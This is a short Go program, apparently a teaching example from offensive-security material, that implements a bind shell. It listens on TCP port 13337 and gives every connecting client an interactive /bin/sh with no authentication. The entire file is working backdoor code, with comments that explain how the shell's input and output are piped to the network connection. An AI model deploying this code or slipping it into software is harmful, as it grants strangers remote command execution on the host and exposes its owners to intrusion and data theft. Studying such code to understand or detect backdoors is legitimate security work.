package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	// Explicitly calling /bin/sh and using -ifor interactive mode
	// so that we can use it for stdin and stdout.
	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin = conn
	// The call to io.Pipe() creates both a reader and a writer that are synchronously connected
	rp, wp := io.Pipe()
	cmd.Stdout = wp
	// link the PipeReaderto the TCPcon-nection.
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":13337")
	if err != nil {
		log.Fatalln("Unable to bind to port")
	}
	log.Println("Listening on :13337")
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}
		go handle(conn)
	}
}
